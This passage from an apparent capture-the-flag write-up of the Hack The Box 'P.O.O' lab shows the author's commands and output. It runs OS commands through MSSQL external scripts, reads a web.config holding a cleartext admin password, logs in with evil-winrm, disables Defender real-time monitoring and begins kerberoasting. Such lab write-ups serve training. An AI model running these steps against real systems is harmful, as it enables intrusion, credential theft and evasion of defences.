<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>df  dbo@master<span class="o">)</span>&gt; EXEC sp_execute_external_script @language <span class="o">=</span>N<span class="s1">&#39;Python&#39;</span>, @script <span class="o">=</span> N<span class="s1">&#39;import os; os.system(&#34;type \inetpub\wwwroot\web.config&#34;);&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">INFO<span class="o">(</span>COMPATIBILITY<span class="se">\P</span>OO_PUBLIC<span class="o">)</span>: Line 0: STDOUT message<span class="o">(</span>s<span class="o">)</span> from external script: 
</span></span><span class="line"><span class="cl">&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span>?&gt;
</span></span><span class="line"><span class="cl">&lt;configuration&gt;
</span></span><span class="line"><span class="cl">    &lt;system.webServer&gt;
</span></span><span class="line"><span class="cl">        &lt;staticContent&gt;
</span></span><span class="line"><span class="cl">            &lt;mimeMap
</span></span><span class="line"><span class="cl">                <span class="nv">fileExtension</span><span class="o">=</span><span class="s2">&#34;.DS_Store&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">mimeType</span><span class="o">=</span><span class="s2">&#34;application/octet-stream&#34;</span>
</span></span><span class="line"><span class="cl">            /&gt;
</span></span><span class="line"><span class="cl">        &lt;/staticContent&gt;
</span></span><span class="line"><span class="cl">        &lt;!--
</span></span><span class="line"><span class="cl">        &lt;authentication <span class="nv">mode</span><span class="o">=</span><span class="s2">&#34;Forms&#34;</span>&gt;
</span></span><span class="line"><span class="cl">            &lt;forms <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;login&#34;</span> <span class="nv">loginUrl</span><span class="o">=</span><span class="s2">&#34;/admin&#34;</span>&gt;
</span></span><span class="line"><span class="cl">                &lt;credentials <span class="nv">passwordFormat</span> <span class="o">=</span> <span class="s2">&#34;Clear&#34;</span>&gt;
</span></span><span class="line"><span class="cl">                    &lt;user 
</span></span><span class="line"><span class="cl">                        <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;Administrator&#34;</span> 
</span></span><span class="line"><span class="cl">                        <span class="nv">password</span><span class="o">=</span><span class="s2">&#34;EverybodyWantsToWorkAtP.O.O.&#34;</span>
</span></span><span class="line"><span class="cl">                    /&gt;
</span></span><span class="line"><span class="cl">                &lt;/credentials&gt;
</span></span><span class="line"><span class="cl">            &lt;/forms&gt;
</span></span><span class="line"><span class="cl">        &lt;/authentication&gt;
</span></span><span class="line"><span class="cl">        --&gt;
</span></span><span class="line"><span class="cl">    &lt;/system.webServer&gt;
</span></span><span class="line"><span class="cl">&lt;/configuration&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Express Edition will <span class="k">continue</span> to be enforced.
</span></span></code></pre></div><p>As seen above, the file contains creds for the administrator account. These could work to get past the basic auth at <code>/admin</code> and return the next flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>n00b㉿v1c70r<span class="o">)</span>-<span class="o">[</span>~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ curl -s http://administrator:EverybodyWantsToWorkAtP.O.O.@10.13.38.11/admin/
</span></span><span class="line"><span class="cl"><span class="s2">&#34;I can&#39;t go back to yesterday, because i was a different person then...&#34;</span>&lt;br&gt;
</span></span><span class="line"><span class="cl">- Alice in Wonderland&lt;br&gt;
</span></span><span class="line"><span class="cl">&lt;br&gt;
</span></span><span class="line"><span class="cl">Flag : POO<span class="o">{[</span>redacted<span class="o">]}</span>
</span></span></code></pre></div>
<h1 class="relative group">Foothold
    <div id="foothold" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#foothold" aria-label="Anchor">#</a>
    </span>
    
</h1>

<h2 class="relative group">Local Enumeration
    <div id="local-enumeration" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#local-enumeration" aria-label="Anchor">#</a>
    </span>
    
</h2>
<p>It took some time to piece everything together. Initially, I found that the host is listening on WinRM, TCP port 5985, for both IPv4 and IPv6 connections:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>df  dbo@master<span class="o">)</span>&gt; EXEC sp_execute_external_script @language <span class="o">=</span>N<span class="s1">&#39;Python&#39;</span>, @script <span class="o">=</span> N<span class="s1">&#39;import os; os.system(&#34;netstat -ano&#34;);&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">INFO<span class="o">(</span>COMPATIBILITY<span class="se">\P</span>OO_PUBLIC<span class="o">)</span>: Line 0: STDOUT message<span class="o">(</span>s<span class="o">)</span> from external script: 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Active Connections
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Proto  Local Address          Foreign Address        State           PID
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       <span class="m">4</span>
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       <span class="m">1004</span>
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       <span class="m">4</span>
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       <span class="m">4788</span>
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       <span class="m">4</span>
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       <span class="m">4</span>
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:41433          0.0.0.0:0              LISTENING       <span class="m">4540</span>
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       <span class="m">4</span>
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       <span class="m">592</span>
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       <span class="m">1356</span>
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       <span class="m">720</span>
</span></span><span class="line"><span class="cl">INFO<span class="o">(</span>COMPATIBILITY<span class="se">\P</span>OO_PUBLIC<span class="o">)</span>: Line 0: STDOUT message<span class="o">(</span>s<span class="o">)</span> from external script: 
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       <span class="m">1860</span>
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       <span class="m">2508</span>
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       <span class="m">720</span>
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:49672          0.0.0.0:0              LISTENING       <span class="m">712</span>
</span></span><span class="line"><span class="cl">  TCP    10.13.38.11:80         10.10.14.172:32772     TIME_WAIT       <span class="m">0</span>
</span></span><span class="line"><span class="cl">  TCP    10.13.38.11:80         10.10.14.172:32782     TIME_WAIT       <span class="m">0</span>
</span></span><span class="line"><span class="cl">  TCP    10.13.38.11:80         10.10.14.172:32794     TIME_WAIT       <span class="m">0</span>
</span></span><span class="line"><span class="cl">  TCP    10.13.38.11:80         10.10.14.172:32798     TIME_WAIT       <span class="m">0</span>
</span></span><span class="line"><span class="cl">  TCP    10.13.38.11:80         10.10.14.172:32806     TIME_WAIT       <span class="m">0</span>
</span></span><span class="line"><span class="cl">  TCP    10.13.38.11:80         10.10.14.172:32822     TIME_WAIT       <span class="m">0</span>
</span></span><span class="line"><span class="cl">  TCP    10.13.38.11:80         10.10.14.172:32828     TIME_WAIT       <span class="m">0</span>
</span></span><span class="line"><span class="cl">  TCP    10.13.38.11:80         10.10.14.172:32834     TIME_WAIT       <span class="m">0</span>
</span></span><span class="line"><span class="cl">..<span class="o">[</span>snip<span class="o">]</span>...
</span></span></code></pre></div><p>Although the initial <code>nmap</code> scan did not show the 5985 listening on IPV4, as seen above, we have winrm actively listening. To check further, I was required to get the IPV6 address of the machine using <code>ipconfig</code> in order for us to scan it using nmap to see if truly winrm is actively listening on the host.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>df  dbo@master<span class="o">)</span>&gt; EXEC sp_execute_external_script @language <span class="o">=</span>N<span class="s1">&#39;Python&#39;</span>, @script <span class="o">=</span> N<span class="s1">&#39;import os; os.system(&#34;ipconfig&#34;);&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">INFO<span class="o">(</span>COMPATIBILITY<span class="se">\P</span>OO_PUBLIC<span class="o">)</span>: Line 0: STDOUT message<span class="o">(</span>s<span class="o">)</span> from external script: 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Windows IP Configuration
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ethernet adapter Ethernet0 2:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . : 
</span></span><span class="line"><span class="cl">   IPv6 Address. . . . . . . . . . . : dead:beef::1001
</span></span><span class="line"><span class="cl">   IPv6 Address. . . . . . . . . . . : dead:beef::7ef0:e82c:6a2:1f2f
</span></span><span class="line"><span class="cl">   Link-local IPv6 Address . . . . . : fe80::8d5a:640b:98c7:f8de%8
</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 10.13.38.11
</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . : dead:beef::1
</span></span><span class="line"><span class="cl">                                       fe80::250:56ff:feb0:8205%8
</span></span><span class="line"><span class="cl">                                       10.13.38.2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ethernet adapter Ethernet1 2:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . : 
</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 172.20.128.101
</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . : 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Express Edition will <span class="k">continue</span> to be enforced.
</span></span></code></pre></div><p>below is the result of the nmap scan which shows clearly, winrm is listening.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>n00b㉿v1c70r<span class="o">)</span>-<span class="o">[</span>~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ nmap -sCV -p- -6 dead:beef::1001
</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-10-07 07:27 EAT
</span></span><span class="line"><span class="cl">Stats: 0:07:57 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing SYN Stealth Scan
</span></span><span class="line"><span class="cl">SYN Stealth Scan Timing: About 98.54% <span class="k">done</span><span class="p">;</span> ETC: 07:35 <span class="o">(</span>0:00:07 remaining<span class="o">)</span>
</span></span><span class="line"><span class="cl">Stats: 0:07:57 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing SYN Stealth Scan
</span></span><span class="line"><span class="cl">SYN Stealth Scan Timing: About 98.58% <span class="k">done</span><span class="p">;</span> ETC: 07:35 <span class="o">(</span>0:00:07 remaining<span class="o">)</span>
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> dead:beef::1001
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.29s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE  VERSION
</span></span><span class="line"><span class="cl">80/tcp   open  http     Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-server-header: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Bad Request
</span></span><span class="line"><span class="cl">1433/tcp open  ms-sql-s Microsoft SQL Server <span class="m">2017</span> 14.00.2056.00<span class="p">;</span> RTM+
</span></span><span class="line"><span class="cl"><span class="p">|</span> ms-sql-info: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   dead:beef::1001:1433: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Version: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>       name: Microsoft SQL Server <span class="m">2017</span> RTM+
</span></span><span class="line"><span class="cl"><span class="p">|</span>       number: 14.00.2056.00
</span></span><span class="line"><span class="cl"><span class="p">|</span>       Product: Microsoft SQL Server <span class="m">2017</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>       Service pack level: RTM
</span></span><span class="line"><span class="cl"><span class="p">|</span>       Post-SP patches applied: <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    TCP port: <span class="m">1433</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2024-10-07T04:35:50+00:00<span class="p">;</span> +3s from scanner time.
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-10-06T09:29:44
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2054-10-06T09:29:44
</span></span><span class="line"><span class="cl"><span class="p">|</span> ms-sql-ntlm-info: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   dead:beef::1001:1433: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Target_Name: POO
</span></span><span class="line"><span class="cl"><span class="p">|</span>     NetBIOS_Domain_Name: POO
</span></span><span class="line"><span class="cl"><span class="p">|</span>     NetBIOS_Computer_Name: COMPATIBILITY
</span></span><span class="line"><span class="cl"><span class="p">|</span>     DNS_Domain_Name: intranet.poo
</span></span><span class="line"><span class="cl"><span class="p">|</span>     DNS_Computer_Name: COMPATIBILITY.intranet.poo
</span></span><span class="line"><span class="cl"><span class="p">|</span>     DNS_Tree_Name: intranet.poo
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Product_Version: 10.0.17763
</span></span><span class="line"><span class="cl">5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Bad Request
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 2s, deviation: 0s, median: 2s
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 499.29 seconds
</span></span></code></pre></div><p>I can establish a connection over WinRM using Evil-WinRM. To facilitate an IPv6 connection, I’ll add the IP address to my local <code>/etc/hosts</code> file. The hostname returned by the box is <code>COMPATIBILITY</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>df  dbo@master<span class="o">)</span>&gt; EXEC sp_execute_external_script @language <span class="o">=</span>N<span class="s1">&#39;Python&#39;</span>, @script <span class="o">=</span> N<span class="s1">&#39;import os; os.system(&#34;hostname&#34;);&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">INFO<span class="o">(</span>COMPATIBILITY<span class="se">\P</span>OO_PUBLIC<span class="o">)</span>: Line 0: STDOUT message<span class="o">(</span>s<span class="o">)</span> from external script: 
</span></span><span class="line"><span class="cl">COMPATIBILITY
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Express Edition will <span class="k">continue</span> to be enforced.
</span></span></code></pre></div><p>as seen below, we have added the IP to our <code>/etc/hosts/</code> file on our attacker machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">127.0.0.1       localhost
</span></span><span class="line"><span class="cl">127.0.1.1       v1c70r
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
</span></span><span class="line"><span class="cl">::1     localhost ip6-localhost ip6-loopback
</span></span><span class="line"><span class="cl">ff02::1 ip6-allnodes
</span></span><span class="line"><span class="cl">ff02::2 ip6-allrouters
</span></span><span class="line"><span class="cl">10.129.141.23 unika.htb
</span></span><span class="line"><span class="cl">10.129.3.186 thetoppers.htb
</span></span><span class="line"><span class="cl">10.129.3.186 s3.thetoppers.htb
</span></span><span class="line"><span class="cl">dead:beef::1001 COMPATIBILITY
</span></span></code></pre></div><p>Its time to connect to our comprised host as shown below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿v1c70r<span class="o">)</span>-<span class="o">[</span>/home/…/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─#  evil-winrm -i compatibility -u administrator -p <span class="s1">&#39;EverybodyWantsToWorkAtP.O.O.&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                        
</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.5
</span></span><span class="line"><span class="cl">                                        
</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function</span> is unimplemented on this machine
</span></span><span class="line"><span class="cl">                                        
</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span><span class="line"><span class="cl">                                        
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; 
</span></span></code></pre></div><p>It is time to get our foothold flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; ls
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
</span></span><span class="line"><span class="cl">----                -------------         ------ ----
</span></span><span class="line"><span class="cl">-a----        3/26/2018   5:29 PM             <span class="m">37</span> flag.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type</span> flag.txt
</span></span><span class="line"><span class="cl">POO<span class="o">{[</span>REDACTED<span class="o">]}</span>
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; 
</span></span></code></pre></div>
<h1 class="relative group">p00ned
    <div id="p00ned" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#p00ned" aria-label="Anchor">#</a>
    </span>
    
</h1>
<p>First, I started by enumerating my privilieges with the admin user.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; whoami /all
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">USER INFORMATION
</span></span><span class="line"><span class="cl">----------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User Name                   <span class="nv">SID</span>
</span></span><span class="line"><span class="cl"><span class="o">===========================</span> <span class="o">==========================================</span>
</span></span><span class="line"><span class="cl">compatibility<span class="se">\a</span>dministrator S-1-5-21-158512341-328150952-995267585-500
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">GROUP INFORMATION
</span></span><span class="line"><span class="cl">-----------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Group Name                                                    Type             SID          <span class="nv">Attributes</span>
</span></span><span class="line"><span class="cl"><span class="o">=============================================================</span> <span class="o">================</span> <span class="o">============</span> <span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\L</span>ocal account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\A</span>dministrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\U</span>sers                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\N</span>ETWORK                                          Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\A</span>uthenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\T</span>his Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\L</span>ocal account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\N</span>TLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">Mandatory Label<span class="se">\H</span>igh Mandatory Level                          Label            S-1-16-12288
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PRIVILEGES INFORMATION
</span></span><span class="line"><span class="cl">----------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Privilege Name                            Description                                                        <span class="nv">State</span>
</span></span><span class="line"><span class="cl"><span class="o">=========================================</span> <span class="o">==================================================================</span> <span class="o">=======</span>
</span></span><span class="line"><span class="cl">SeIncreaseQuotaPrivilege                  Adjust memory quotas <span class="k">for</span> a process                                 Enabled
</span></span><span class="line"><span class="cl">SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
</span></span><span class="line"><span class="cl">SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
</span></span><span class="line"><span class="cl">SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
</span></span><span class="line"><span class="cl">SeSystemProfilePrivilege                  Profile system performance                                         Enabled
</span></span><span class="line"><span class="cl">SeSystemtimePrivilege                     Change the system <span class="nb">time</span>                                             Enabled
</span></span><span class="line"><span class="cl">SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
</span></span><span class="line"><span class="cl">SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
</span></span><span class="line"><span class="cl">SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
</span></span><span class="line"><span class="cl">SeBackupPrivilege                         Back up files and directories                                      Enabled
</span></span><span class="line"><span class="cl">SeRestorePrivilege                        Restore files and directories                                      Enabled
</span></span><span class="line"><span class="cl">SeShutdownPrivilege                       Shut down the system                                               Enabled
</span></span><span class="line"><span class="cl">SeDebugPrivilege                          Debug programs                                                     Enabled
</span></span><span class="line"><span class="cl">SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
</span></span><span class="line"><span class="cl">SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
</span></span><span class="line"><span class="cl">SeUndockPrivilege                         Remove computer from docking station                               Enabled
</span></span><span class="line"><span class="cl">SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
</span></span><span class="line"><span class="cl">SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
</span></span><span class="line"><span class="cl">SeCreateGlobalPrivilege                   Create global objects                                              Enabled
</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege             Increase a process working <span class="nb">set</span>                                     Enabled
</span></span><span class="line"><span class="cl">SeTimeZonePrivilege                       Change the <span class="nb">time</span> zone                                               Enabled
</span></span><span class="line"><span class="cl">SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
</span></span><span class="line"><span class="cl">SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token <span class="k">for</span> another user in the same session Enabled
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">USER CLAIMS INFORMATION
</span></span><span class="line"><span class="cl">-----------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User claims unknown.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Kerberos support <span class="k">for</span> Dynamic Access Control on this device has been disabled.
</span></span></code></pre></div><p>As seen above, it is clear we are a local admin user of the system. We will now use this hos as our jump point  to other hosts. below is the address of the machine</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; ipconfig
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Windows IP Configuration
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ethernet adapter Ethernet0 2:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . :
</span></span><span class="line"><span class="cl">   IPv6 Address. . . . . . . . . . . : dead:beef::1001
</span></span><span class="line"><span class="cl">   IPv6 Address. . . . . . . . . . . : dead:beef::7ef0:e82c:6a2:1f2f
</span></span><span class="line"><span class="cl">   Link-local IPv6 Address . . . . . : fe80::8d5a:640b:98c7:f8de%8
</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 10.13.38.11
</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . : dead:beef::1
</span></span><span class="line"><span class="cl">                                       fe80::250:56ff:feb0:8205%8
</span></span><span class="line"><span class="cl">                                       10.13.38.2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ethernet adapter Ethernet1 2:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . :
</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 172.20.128.101
</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . :
</span></span></code></pre></div>
<h2 class="relative group">Kerberoasting
    <div id="kerberoasting" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#kerberoasting" aria-label="Anchor">#</a>
    </span>
    
</h2>
<p>Next, I decided to perform some kerberoasting in order to get some tickets we could use to get access to another user but first, I had to disable realtime monitoring as shown below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\u</span>sers&gt; set-mppreference -disablerealtimemonitoring <span class="nv">$true</span>
</span></span></code></pre></div><p>After uploading our powershell script onto the host machine, we shall run it from the sql server as shown below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>df  dbo@master<span class="o">)</span>&gt; xp_cmdshell powershell -c import-module C:<span class="se">\T</span>emp<span class="se">\i</span>nvoke-kerberoast.ps1<span class="p">;</span> invoke-kerberoast 
